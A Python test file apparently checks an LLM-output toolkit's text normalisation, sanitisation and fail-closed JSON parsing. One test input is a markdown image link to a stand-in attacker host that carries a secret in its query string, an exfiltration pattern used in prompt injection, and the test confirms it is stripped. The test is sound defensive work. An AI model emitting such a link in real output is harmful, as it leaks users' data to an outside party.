import json

import pytest

from agentic_core import normalize, parse_json_object, sanitize_llm_text


def test_normalize():
    assert normalize("  It’s\n\t“OK”  ") == 'it\'s "ok"'


def test_llm_text_is_sanitized():
    s = sanitize_llm_text(
        "see ![x](https://evil.example/?d=secret) and [docs](http://a.b) www.c.d <b>hi</b>"
    )
    assert "evil.example" not in s and "http" not in s and "www." not in s and "<b>" not in s
    assert "docs" in s and "hi" in s and "[image removed]" in s


def test_parse_json_object_plain_and_wrapped():
    assert parse_json_object('{"a": 1}') == {"a": 1}
    assert parse_json_object('Sure! Here it is:\n```json\n{"a": {"b": 2}}\n```') == {"a": {"b": 2}}


@pytest.mark.parametrize("bad", ["", "no json here", "[1, 2]", '{"a": ', "{not json}"])
def test_malformed_output_raises_so_caller_fails_closed(bad):
    with pytest.raises(ValueError):
        parse_json_object(bad)


def test_json_decode_error_is_a_value_error():
    assert issubclass(json.JSONDecodeError, ValueError)
